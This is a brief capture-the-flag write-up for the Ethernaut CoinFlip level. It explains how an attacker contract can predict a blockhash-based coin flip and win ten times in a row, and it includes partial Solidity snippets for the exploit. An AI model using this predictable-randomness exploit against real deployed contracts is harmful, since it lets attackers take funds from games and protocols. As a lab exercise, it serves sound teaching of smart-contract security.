# Coinflip Ethernaut

## Goals

=> Guess the Coinflip with the right result 10x in a row

- Here we just need to make a contract which calls get's deployed and then also has access to the `block.number` which gives us the ability to generate the pseudo random blockValue and we can then just copy paste the following code block

```solidity
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    return side;
```

which will return us true / false which will be the next result then we just need to call the following function 10 times and we will win everytime

```solidity
    function hackFlip() external {
        bool guess = _guess;
        coinFlip.flip(guess);
    }
```

since guess will always be the same as in CoinFlip this will always calculate the right answer and thus win everytime, we now have to do 10 transactions to reach our goal
